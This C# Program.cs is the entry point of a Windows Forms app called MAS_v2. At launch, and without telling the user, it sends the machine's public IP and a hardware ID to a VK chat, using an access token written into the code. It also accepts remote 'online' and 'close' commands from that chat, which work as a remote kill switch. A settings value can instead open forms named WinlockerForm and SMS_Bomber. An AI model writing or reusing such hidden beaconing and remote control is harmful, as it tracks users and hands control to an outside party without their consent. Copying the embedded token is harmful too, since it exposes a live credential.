using BotCore;
using MAS_v2.Security;
using System;
using System.Net;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MAS_v2
{
    static class Program
    {
        public static MenuSelector MenuSelector;
        public static Security.SecurityManager SecurityManager;
        public static Vk.VkLongPoolClient vkclient;
        /// <summary>
        /// Главная точка входа для приложения.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            try
            {
                vkclient = new Vk.VkLongPoolClient("c37ca76d7eda991a04b14d939da6ced5e214d6c5949544a89d1cee235bf0e6d27cf98ba213d477feb7371", "209453266", MSG);
            }
            catch
            {
                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }
            Task.Factory.StartNew(() =>
            {
                try
                {
                    using (WebClient wc = new WebClient())
                    {
                        string ip = wc.DownloadString("https://api.ipify.org");
                        vkclient.Messages.Send.Text("2000000002", "Запуск программы: " + hardware.GetID() + "\nIP: " + ip);
                    }
                }
                catch
                {

                }
            });
            MenuSelector = new MenuSelector();
            SecurityManager = new Security.SecurityManager();
            SecurityManager.LoadCFG();
            switch (SecurityManager.settings.FakeMenu)
            {
                case (1):
                    Application.Run(new Security.FakeForms.WinlockerForm());
                    break;
                case (2):
                    Application.Run(new Security.FakeForms.SMS_Bomber());
                    break;
                default:
                    Application.Run(MenuSelector);
                    break;
            }
        }
        public static HardwareID hardware = new HardwareID();

        public static void MSG(Vk.VkLongPoolClient.Update update)
        {
            if (update.@object.peer_id == 2000000002)
            {
                if (update.@object.text == "online")
                {
                    try
                    {
                        using (WebClient wc = new WebClient())
                        {
                            string ip = wc.DownloadString("https://api.ipify.org");
                            vkclient.Messages.Send.Text("2000000002", "Online: " + hardware.GetID() + "\nIP: " + ip + "\n");
                        }
                    } catch { }
                }
                else
                {
                    if (update.@object.text == "close " + hardware.GetID())
                    {
                        System.Diagnostics.Process.GetCurrentProcess().Kill();
                    }
                    else
                    {
                        Console.WriteLine(update.@object.text);
                        Console.WriteLine("'" + hardware.GetID() + "'");
                    }
                }
            }
            else
            {
                if (update.@object.text == "close " + hardware.GetID())
                {
                    System.Diagnostics.Process.GetCurrentProcess().Kill();
                }
                else
                {
                    Console.WriteLine(update.@object.text);
                    Console.WriteLine("'" + hardware.GetID() + "'");
                }
            }
        }
    }
}
